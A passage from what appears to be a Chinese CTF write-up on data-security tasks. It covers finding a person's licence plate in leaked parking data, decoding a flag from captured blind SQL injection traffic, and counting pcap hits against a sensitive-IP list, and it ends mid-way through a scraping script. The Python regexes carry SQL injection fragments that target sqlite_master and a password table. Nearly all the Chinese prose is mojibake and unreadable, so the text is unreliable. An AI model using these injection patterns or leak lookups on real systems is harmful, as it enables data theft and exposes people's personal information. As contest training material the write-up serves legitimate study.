åå¼ºçš„è½¦ç‰Œå·"></a>5ã€å¼ åå¼ºçš„è½¦ç‰Œå·</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">[!important]<br><br>- è½¦ç‰Œå·çš„æ ¼å¼ä¸ºï¼š`çœçš„ç®€å†™+å¤§å†™å­—æ¯+ç©ºæ ¼+<span class="hljs-number">5</span>ä½å­—ç¬¦`ï¼Œå¦‚`è‹D PT666`ï¼Œ`è‹D`å’Œ`PT666`ä¸­é—´å­˜åœ¨ä¸€ä¸ªç©ºæ ¼<br></code></pre></td></tr></table></figure><p>é€šè¿‡æ‰‹æœºå·ï¼Œåœ¨åœè½¦åœºæ³„éœ²çš„æ•°æ®ä¸­æˆåŠŸæ‰¾åˆ°è½¦ç‰Œå·ï¼Œ1357.jpg å›¾ç‰‡</p><p><img src="https://img.dkdun.cn/v1/2025/12/2afcec28d5a2a437.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">æµ™<span class="hljs-keyword">B</span> QY318<br></code></pre></td></tr></table></figure><h2 id="æ•°æ®æ”»é˜²"><a href="#æ•°æ®æ”»é˜²" class="headerlink" title="æ•°æ®æ”»é˜²"></a>æ•°æ®æ”»é˜²</h2><h3 id="ä»»åŠ¡-1-1"><a href="#ä»»åŠ¡-1-1" class="headerlink" title="ä»»åŠ¡ 1"></a>ä»»åŠ¡ 1</h3><p>å…ˆæŠŠ http çš„è¯·æ±‚å…¨éƒ¨ dump å‡ºæ¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/c3ba53e95d2885b3.png"></p><p>ç”¨è„šæœ¬æå–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># è¯»å–æ–‡ä»¶å†…å®¹</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;F:\\CTF question\\2025 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›æ•°å­—å®‰å…¨èµ›é“æ•°æ®å®‰å…¨äº§ä¸šç§¯åˆ†äº‰å¤ºèµ›åˆèµ›-è¥¿åŒº\\æ•°æ®åˆ†æ\\æ•°æ®æ”»é˜²\\http_get_post_data.txt&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    å†…å®¹ = f.read()<br><br><span class="hljs-comment"># å®šä¹‰æ­£åˆ™è§„åˆ™</span><br>æ­£åˆ™è§„åˆ™s = [<br>    <span class="hljs-string">r&quot;NOT%20like%20&#x27;sqlite_%25&#x27;\),(.*?),1\)\)=&#x27;(.*?)&#x27;&quot;</span>,<br>    <span class="hljs-string">r&quot;from%20sqlite_master%20where%20type=&#x27;table&#x27;\),(.*?),1\)\)=&#x27;(.*?)&#x27;&quot;</span>,<br>    <span class="hljs-string">r&quot;group_concat\(fl4g_1s_here\)%20from%20password\),(.*?),1\)\)=&#x27;(.*?)&#x27;&quot;</span><br>]<br><br><span class="hljs-comment"># ç”¨äºå­˜å‚¨åŒ¹é…åˆ°çš„ç»“æœ</span><br>å­˜å‚¨åˆ—è¡¨ = []<br><br><span class="hljs-comment"># éå†æ­£åˆ™è§„åˆ™ï¼ŒæŸ¥æ‰¾åŒ¹é…é¡¹</span><br><span class="hljs-keyword">for</span> æ­£åˆ™è§„åˆ™ <span class="hljs-keyword">in</span> æ­£åˆ™è§„åˆ™s:<br>    pat = re.<span class="hljs-built_in">compile</span>(æ­£åˆ™è§„åˆ™)<br>    å­˜å‚¨åˆ—è¡¨.extend(pat.findall(å†…å®¹))<br><br><span class="hljs-comment"># è¾“å‡ºåŒ¹é…åçš„æ•°ç»„å†…å®¹ï¼Œæ–¹ä¾¿è°ƒè¯•</span><br><span class="hljs-built_in">print</span>(å­˜å‚¨åˆ—è¡¨)<br><br><span class="hljs-comment"># åˆå§‹åŒ–flagæ•°ç»„</span><br>flag = [<span class="hljs-string">&quot;&quot;</span>] * <span class="hljs-number">100000</span>  <span class="hljs-comment"># å‡è®¾é•¿åº¦ä¸º100000</span><br><br><span class="hljs-comment"># å¤„ç†åŒ¹é…é¡¹</span><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> å­˜å‚¨åˆ—è¡¨:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(t) == <span class="hljs-number">2</span>:<br>        index = <span class="hljs-built_in">int</span>(t[<span class="hljs-number">0</span>])  <span class="hljs-comment"># è·å–ä¸‹æ ‡</span><br>        char = t[<span class="hljs-number">1</span>]  <span class="hljs-comment"># è·å–å­—ç¬¦</span><br>        flag[index] = char<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Skipping invalid match: <span class="hljs-subst">&#123;t&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># æ‹¼æ¥æœ€ç»ˆç»“æœ</span><br>result = <span class="hljs-string">&#x27;&#x27;</span>.join(flag).strip()<br><br><span class="hljs-comment"># è¾“å‡ºæœ€ç»ˆç»“æœ</span><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/7396aacd00ad1f27.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">66383463343233336464313835636133633038336337623364626334666638627E7E7E7E7E7E7E<br></code></pre></td></tr></table></figure><p>åˆ æ‰åé¢çš„ 7E é‚£äº›å­—ç¬¦</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">6638346334323333646431383563613363303833633762336462633466663862<br></code></pre></td></tr></table></figure><p>md5 è§£å¯†å¾—åˆ°ç»“æœ</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">f<span class="hljs-number">84</span><span class="hljs-keyword">c</span><span class="hljs-number">4233</span>dd<span class="hljs-number">185</span>ca<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">083</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>b<span class="hljs-number">3</span>dbc<span class="hljs-number">4</span>ff<span class="hljs-number">8</span>b<br></code></pre></td></tr></table></figure><h2 id="æ•°æ®è·¨å¢ƒ"><a href="#æ•°æ®è·¨å¢ƒ" class="headerlink" title="æ•°æ®è·¨å¢ƒ"></a>æ•°æ®è·¨å¢ƒ</h2><h3 id="ä»»åŠ¡-1-2"><a href="#ä»»åŠ¡-1-2" class="headerlink" title="ä»»åŠ¡ 1"></a>ä»»åŠ¡ 1</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>ã€è¯·åˆ†ææµé‡å®¡è®¡è®¾å¤‡å¯¼å‡ºçš„é•œåƒæµé‡æ•°æ®ï¼Œå¹¶å¯¹ç…§å›½å¤–æ•æ„ŸåŸŸåæ¸…å•ï¼ˆä»¥ä¸‹ç®€ç§°â€œæ¸…å•â€ï¼‰ï¼Œ<br>ç¡®è®¤æ˜¯å¦å­˜åœ¨è®¿é—®æ¸…å•ä¸­<span class="hljs-built_in">IP</span>åœ°å€çš„æƒ…å†µã€‚åŒæ—¶ï¼Œè¯·åˆ†ææ‰€æœ‰å‘æ¸…å•ä¸­<span class="hljs-built_in">IP</span>åœ°å€å‘é€æµé‡åŒ…çš„â¾ä¸ºï¼Œ<br>å¹¶ç»Ÿè®¡è®¿é—®æ¬¡æ•°æœ€å¤šçš„<span class="hljs-built_in">IP</span>åœ°å€ã€‚<br></code></pre></td></tr></table></figure><p>æ•°æ®é‡å¤ªå¤§äº†çœ‹ä¸å‡ºæ¥ç»“æœï¼Œæ‹¿è„šæœ¬è·‘äº†ï¼Œpoc å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> rdpcap<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># æ–‡ä»¶è·¯å¾„é…ç½®ï¼ˆè¯·ç¡®è®¤å®é™…è·¯å¾„ï¼‰</span><br>SENSITIVE_JSON = <span class="hljs-string">r&quot;F:\CTF question\2025 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›æ•°å­—å®‰å…¨èµ›é“æ•°æ®å®‰å…¨äº§ä¸šç§¯åˆ†äº‰å¤ºèµ›åˆèµ›-è¥¿åŒº\æ•°æ®åˆ†æ\æ•°æ®è·¨å¢ƒ\16.æ™®é€šäººçš„æ•°æ®è·¨å¢ƒè¡Œä¸º\é™„ä»¶\æ™®é€šäººçš„æ•°æ®è·¨å¢ƒè¡Œä¸ºçš„é™„ä»¶\å›½å¤–æ•æ„ŸåŸŸåæ¸…å•.json&quot;</span><br>PCAP_FILE = <span class="hljs-string">r&quot;F:\CTF question\2025 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›æ•°å­—å®‰å…¨èµ›é“æ•°æ®å®‰å…¨äº§ä¸šç§¯åˆ†äº‰å¤ºèµ›åˆèµ›-è¥¿åŒº\æ•°æ®åˆ†æ\æ•°æ®è·¨å¢ƒ\16.æ™®é€šäººçš„æ•°æ®è·¨å¢ƒè¡Œä¸º\é™„ä»¶\æ™®é€šäººçš„æ•°æ®è·¨å¢ƒè¡Œä¸ºçš„é™„ä»¶\æŸæµé‡å®¡è®¡å¹³å°å¯¼å‡ºçš„é•œåƒæµé‡.pcap&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_sensitive_list</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;è§£æå¤šå±‚åµŒå¥—JSONç»“æ„&quot;&quot;&quot;</span><br>    ip_domain = &#123;&#125;<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(SENSITIVE_JSON, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            data = json.load(f)<br><br>            <span class="hljs-comment"># éå†æ‰€æœ‰åˆ†ç±»</span><br>            <span class="hljs-keyword">for</span> category <span class="hljs-keyword">in</span> data[<span class="hljs-string">&#x27;categories&#x27;</span>].values():<br>                <span class="hljs-comment"># æå–æ¯ä¸ªåˆ†ç±»ä¸‹çš„åŸŸååˆ—è¡¨</span><br>                domains = category.get(<span class="hljs-string">&#x27;domains&#x27;</span>, &#123;&#125;)<br>                <span class="hljs-keyword">for</span> domain, ip <span class="hljs-keyword">in</span> domains.items():<br>                    <span class="hljs-comment"># éªŒè¯IPæ ¼å¼</span><br>                    <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, ip):<br>                        ip_domain[ip] = domain<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è­¦å‘Šï¼šæ— æ•ˆIPæ ¼å¼ <span class="hljs-subst">&#123;ip&#125;</span> å¯¹åº”åŸŸå <span class="hljs-subst">&#123;domain&#125;</span>&quot;</span>)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æˆåŠŸåŠ è½½ <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(ip_domain)&#125;</span> ä¸ªæœ‰æ•ˆIPæ˜ å°„&quot;</span>)<br>            <span class="hljs-keyword">return</span> ip_domain<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;JSONè§£æå¤±è´¥: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_pcap</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;åˆ†æPCAPæ–‡ä»¶&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        ip_domain = load_sensitive_list()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ip_domain:<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># åˆå§‹åŒ–ç»Ÿè®¡</span><br>        access_stats = defaultdict(<span class="hljs-built_in">int</span>)<br>        total_packets = <span class="hljs-number">0</span><br>        matched_packets = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># ä½¿ç”¨æ›´é«˜æ•ˆçš„PcapReaderé€åŒ…å¤„ç†</span><br>        packets = rdpcap(PCAP_FILE)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nå¼€å§‹åˆ†æ <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(packets)&#125;</span> ä¸ªæ•°æ®åŒ…...&quot;</span>)<br><br>        <span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> packets:<br>            total_packets += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> pkt.haslayer(<span class="hljs-string">&#x27;IP&#x27;</span>):<br>                dst_ip = pkt[<span class="hljs-string">&#x27;IP&#x27;</span>].dst<br>                <span class="hljs-keyword">if</span> dst_ip <span class="hljs-keyword">in</span> ip_domain:<br>                    access_stats[dst_ip] += <span class="hljs-number">1</span><br>                    matched_packets += <span class="hljs-number">1</span><br><br>        <span class="hljs-comment"># è¾“å‡ºåŸºç¡€ç»Ÿè®¡</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nåˆ†æå®Œæˆ: å…±å¤„ç†<span class="hljs-subst">&#123;total_packets&#125;</span>ä¸ªåŒ…ï¼ŒåŒ¹é…åˆ°<span class="hljs-subst">&#123;matched_packets&#125;</span>ä¸ªæ•æ„Ÿæµé‡åŒ…&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> access_stats:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æœªå‘ç°æ•æ„ŸIPè®¿é—®&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># æ‰¾å‡ºæœ€é«˜é¢‘è®¿é—®</span><br>        max_count = <span class="hljs-built_in">max</span>(access_stats.values())<br>        results = [(ip, count) <span class="hljs-keyword">for</span> ip, count <span class="hljs-keyword">in</span> access_stats.items() <span class="hljs-keyword">if</span> count == max_count]<br><br>        <span class="hljs-comment"># æ ¼å¼åŒ–è¾“å‡º</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\næœ€é«˜é¢‘è®¿é—®è®°å½•:&quot;</span>)<br>        <span class="hljs-keyword">for</span> ip, count <span class="hljs-keyword">in</span> results:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip_domain[ip]&#125;</span>:<span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;count&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æµé‡åˆ†æå¼‚å¸¸: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    analyze_pcap()<br><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/fb49131c112a9eee.png"></p><p>å¾—åˆ°ç»“æœ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chrome</span>.com:<span class="hljs-number">57.195.144.48:20498</span><br></code></pre></td></tr></table></figure><h1 id="æ¨¡å‹å®‰å…¨"><a href="#æ¨¡å‹å®‰å…¨" class="headerlink" title="æ¨¡å‹å®‰å…¨"></a>æ¨¡å‹å®‰å…¨</h1><h2 id="æ•°æ®é¢„å¤„ç†"><a href="#æ•°æ®é¢„å¤„ç†" class="headerlink" title="æ•°æ®é¢„å¤„ç†"></a>æ•°æ®é¢„å¤„ç†</h2><h3 id="1-ä»»åŠ¡â¼€ï¼šæ•°æ®æ ‡æ³¨ä¸å®Œæ•´æ€§æ ¡éªŒ"><a href="#1-ä»»åŠ¡â¼€ï¼šæ•°æ®æ ‡æ³¨ä¸å®Œæ•´æ€§æ ¡éªŒ" class="headerlink" title="1.ä»»åŠ¡â¼€ï¼šæ•°æ®æ ‡æ³¨ä¸å®Œæ•´æ€§æ ¡éªŒ"></a>1.ä»»åŠ¡â¼€ï¼šæ•°æ®æ ‡æ³¨ä¸å®Œæ•´æ€§æ ¡éªŒ</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">ã€é¢˜â¼²æè¿°ã€‘<br>é’ˆå¯¹åœ¨çº¿å›¢è´­å¹³å°æä¾›çš„åŸå§‹â½¤â¼¾è¯„è®ºæ•°æ®ï¼Œçˆ¬å–â½¤â¼¾è¯„è®ºæ•°æ®ï¼Œè¿›â¾æƒ…æ„Ÿæ ‡æ³¨ï¼ˆæ­£â¾¯/è´Ÿâ¾¯ï¼‰ï¼Œå¹¶åŸºäºâ½¤â¼¾IDã€â½¤â¼¾åã€â¼¿æœºå·â½£æˆMD5ç­¾åä»¥æ ¡éªŒå®Œæ•´æ€§ã€‚æŒ‰é™„ä»¶æ¨¡æ¿å’Œä»»åŠ¡ä¹¦è¦æ±‚æäº¤å¤„ç†åçš„submit_1<span class="hljs-selector-class">.csv</span>â½‚ä»¶è¿›â¾è¯„åˆ†ã€‚<br><br>ã€ç­”æ¡ˆæäº¤ã€‘<br>æäº¤ä»…åŒ…å«<span class="hljs-number">3</span>åˆ—å†…å®¹çš„submit_1<span class="hljs-selector-class">.csv</span>â½‚ä»¶ã€‚<br>â€¢ ç¬¬â¼€åˆ—ä¸ºuser_idï¼ˆéœ€è¦ä¸åœ¨çº¿å›¢è´­å¹³å°ä¸­â½¤â¼¾è¯„ä»·çš„â½¤â¼¾IDå¯¹åº”ï¼Œä¸¥æ ¼æŒ‰ç…§å‡åºæ’åˆ—ï¼‰<br>â€¢ ç¬¬â¼†åˆ—ä¸º<span class="hljs-selector-tag">label</span>ï¼ˆå¡«å†™æƒ…æ„Ÿæ ‡æ³¨ç»“æœï¼Œä»…â½€æŒ<span class="hljs-number">0</span>/<span class="hljs-number">1</span> <span class="hljs-selector-attr">[è´Ÿå‘æƒ…æ„Ÿ/æ­£å‘æƒ…æ„Ÿ]</span>ï¼‰<br>â€¢ ç¬¬ä¸‰åˆ—ä¸ºsignatureï¼ˆå¡«å†™åŸºäºâ½¤â¼¾IDã€â½¤â¼¾åã€â¼¿æœºå·â½£æˆçš„MD5ç­¾åï¼Œç­¾åç®—æ³•ï¼š<span class="hljs-number">32</span>ä½â¼©å†™<br>MD5<span class="hljs-selector-attr">[â½¤â¼¾ID + â½¤â¼¾å + â¼¿æœºå·]</span> ï¼‰<br></code></pre></td></tr></table></figure><p>æœ¬æ¥æƒ³è¯´äººå·¥ç­›æŸ¥çš„ï¼Œä½†æ˜¯å¤ªå¤šäº†ï¼Œè€Œä¸”å¤ªæ…¢äº†ï¼Œåˆ†æé¡µé¢æƒ…å†µåå†™å‡ºç®€å•ä»£ç ç„¶åè®© deepseek è€å¸ˆä¼˜åŒ–ä¸€ä¸‹ï¼Œæœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Tuple</span>, <span class="hljs-type">Optional</span>, <span class="hljs-type">Dict</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-comment"># é…ç½®æ—¥å¿—</span><br>logging.basicConfig(<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span><br>)<br>logger = logging.getLogger(__name__)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;é›†ä¸­ç®¡ç†é…ç½®å‚æ•°&quot;&quot;&quot;</span><br>    BASE_DOMAIN = <span class="hljs-string">&quot;http://47.117.190.214:32800/&quot;</span><br>    ENDPOINT = <span class="hljs-string">&quot;/index.php&quot;</span><br>    REQUEST_TIMEOUT = <span class="hljs-number">15</span><br>    MAX_PRODUCTS = <span class="hljs-number">500</span><br>    OUTPUT_FILE = <span class="hljs-string">&quot;submit_1.csv&quot;</span><br>    HEADERS = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 &quot;</span><br>                      <span class="hljs-string">&quot;(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;</span><br>    &#125;<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">full_url</span>(<span class="hljs-params">cls</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;ç”Ÿæˆå®Œæ•´è¯·æ±‚URL&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> urljoin(cls.BASE_DOMAIN, cls.ENDPOINT)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_field_value</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, separator: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;ï¼š&quot;</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;é€šç”¨å­—æ®µæå–å‡½æ•°&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> text.split(separator, <span class="hljs-number">1</span>)[-<span 